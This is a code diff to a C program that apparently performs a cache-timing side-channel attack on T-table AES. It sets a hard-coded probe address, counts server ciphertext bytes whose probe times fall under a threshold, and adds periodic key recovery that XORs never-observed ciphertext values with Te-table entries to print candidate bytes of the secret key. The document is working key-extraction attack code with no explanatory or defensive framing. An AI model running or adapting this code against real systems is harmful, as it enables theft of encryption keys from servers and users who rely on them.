@@ -28,7 +28,7 @@ int main(int argc, char* argv[])
     int X[16][256], Y[16][256], K[16][256];
 
 
-    nehalem_setup(0x3ac1011a0);
+    nehalem_setup(0x38824d1a0);
 
     for (i = 0; i < REPS; ++i) {
         times[i] = 0;
@@ -97,13 +97,54 @@ int main(int argc, char* argv[])
 
         }
 
-
+        // if min probe time is less than a threshold increase counters for specific ciphertext
         for (i = 0; i < 16; ++i) {
             if (min_prob_time < 900) {
                 c++;
                 X[i][(unsigned int)server_reply[i]] += 1;
             }
             Y[i][(unsigned int)server_reply[i]] += 1;
+        }
+        
+
+
+
+
+
+
+
+        // Realtime calculation
+        if (count % 10000 == 0) {
+            int TeN = 0;
+
+            for (i = 0; i < 16; ++i) {
+                for (j = 0; j < 256; ++j) {
+                    K[i][j] = 0;
+                }
+            }
+
+            for (m = 0; m < 16; ++m) {
+                for (i = 0; i < 256; ++i) {
+                    if (X[m][i] < 1) {
+                        for (j = 0; j < 16; ++j) {
+                            TeN = (get_TeN_idx(4, j/4) & (0xFF<<(j%4)*8) ) >> (j%4)*8;
+                            //printf("i=%d\txor\tTe0=%d\t->\t%d\n", i, TeN, i^TeN);
+                            K[m][i ^ TeN] += 1;
+                        }
+                    }
+                    //printf("%x\n", get_TeN_idx(0, i));
+                }
+            }
+            
+            for (j = 0; j < 16; ++j) {
+                printf("Byte %d: ", j);
+                for (i = 0; i < 256; ++i) {
+                    if (K[j][i] == 16) {
+                        printf("0x%02x\t", i);
+                    }
+                }
+                printf("\n");
+            }
         }
         
 
@@ -119,8 +160,13 @@ int main(int argc, char* argv[])
 
 
 
-
     int TeN = 0;
+
+    for (i = 0; i < 16; ++i) {
+        for (j = 0; j < 256; ++j) {
+            K[i][j] = 0;
+        }
+    }
 
     for (m = 0; m < 16; ++m) {
         for (i = 0; i < 256; ++i) {
@@ -233,6 +279,12 @@ for (j = 0; j < 16; ++j) {
 
     return 0;
 }
+
+
+
+
+
+
 
 
 
